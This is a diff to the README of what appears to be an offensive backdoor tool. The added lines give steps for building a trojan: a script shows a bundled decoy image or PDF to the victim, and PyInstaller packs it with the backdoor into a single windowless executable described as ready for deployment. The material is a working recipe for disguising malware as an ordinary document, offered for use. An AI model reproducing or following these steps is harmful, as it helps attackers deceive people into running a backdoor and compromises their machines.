@@ -46,14 +46,27 @@ Now, the executable is ready for deployment.
 
 Step 1
 
-Edit backdoor.py
+Edit backdoor_trojan.py
 ```
+filename = "<Filename>"
+temp_folder = sys._MEIPASS + "/"
+file = temp_folder + filename
+img = Image.open(file) 
+# this is is the file you want to use is a image
+img.show()
+# os.system(path)
+# uncomment the above if its not an image (like a pdf)
 ```
-step 2
+Step 2
 
 Use pyinstaller
 ```
+pip3 install pyinstaller
+pyinstaller --add-data "<Full path of the image/pdf>:." --onefile --noconsole backdoor_trojan.py
 ```
+The executable will be found in the dist folder
+
+Now, the executable is ready for deployment.
 
 ## Usage
 
